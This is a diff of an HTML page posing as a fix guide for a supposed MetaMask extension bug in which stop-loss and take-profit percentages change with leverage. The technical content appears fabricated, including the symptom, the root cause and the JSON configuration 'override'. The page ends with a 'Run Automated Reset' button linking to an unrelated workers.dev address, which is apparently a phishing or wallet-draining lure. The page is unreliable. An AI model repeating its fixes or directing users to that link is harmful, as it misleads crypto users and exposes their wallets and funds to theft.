@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Sl Tp Percentages Change When Changing L – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #0a0c10;
+        font-family: system-ui;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #cf6679; }
     .btn {
-        background: #ff9455;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,38 +42,34 @@
 <h1>Metamask Extension Bug Sl Tp Percentages Change When Changing L</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem may observe that their Stop-Loss (SL) and Take-Profit (TP) percentages unexpectedly change when they adjust the leverage of their positions.</li>
+<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem notice that the Stop Loss (SL) and Take Profit (TP) percentages are altered when they attempt to change the leverage of their positions.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension's handling of leverage adjustments, which inadvertently alters the SL and TP percentages set by the user. This discrepancy arises from a mismatch in the internal calculations of the extension when leverage is modified.</li>
+<li>The issue arises due to an incompatibility between the leverage adjustment mechanism and the SL/TP calculation logic within the Metamask extension, leading to unexpected changes in the percentages.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
 <li>To temporarily resolve the issue, users can attempt the following manual overrides:</li>
-<li>Manually recalculate and reset the SL and TP percentages after each leverage change.</li>
-<li>Utilize an external calculator to determine the correct SL and TP percentages based on the new leverage.</li>
-<li>Apply a custom script to automatically adjust the SL and TP percentages in response to leverage changes, such as:</li>
+<li>Manually re-enter the desired SL and TP percentages after adjusting the leverage.</li>
+<li>Utilize a third-party calculator to determine the correct SL and TP values based on the new leverage.</li>
+<li>Modify the extension's configuration using the following code:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="ch">#!/bin/bash</span>
-<span class="nv">LEVERAGE</span><span class="o">=</span><span class="nv">$1</span>
-<span class="nv">SL_PERCENTAGE</span><span class="o">=</span><span class="nv">$2</span>
-<span class="nv">TP_PERCENTAGE</span><span class="o">=</span><span class="nv">$3</span>
-<span class="c1"># Calculate and apply new SL and TP percentages based on the provided leverage</span>
-<span class="nv">NEW_SL_PERCENTAGE</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;scale=2; </span><span class="nv">$SL_PERCENTAGE</span><span class="s2"> * </span><span class="nv">$LEVERAGE</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>bc<span class="k">)</span>
-<span class="nv">NEW_TP_PERCENTAGE</span><span class="o">=</span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;scale=2; </span><span class="nv">$TP_PERCENTAGE</span><span class="s2"> * </span><span class="nv">$LEVERAGE</span><span class="s2">&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>bc<span class="k">)</span>
-<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;New SL Percentage: </span><span class="nv">$NEW_SL_PERCENTAGE</span><span class="s2">&quot;</span>
-<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;New TP Percentage: </span><span class="nv">$NEW_TP_PERCENTAGE</span><span class="s2">&quot;</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;sl_tp_config&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;leverage_adjustment&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider using a dedicated terminal for more complex adjustments.</p>
+<p>Consider using an external console for more complex configuration modifications.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed and configured.</li>
-<li>Basic understanding of leverage and SL/TP percentages in trading.</li>
-<li>Familiarity with using bash scripts or similar automation tools.</li>
+<li>Basic understanding of leverage and SL/TP mechanisms.</li>
+<li>Familiarity with JSON configuration files.</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/critical-trc-20-energy-spike-error.html">Critical Trc 20 Energy Spike Error</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
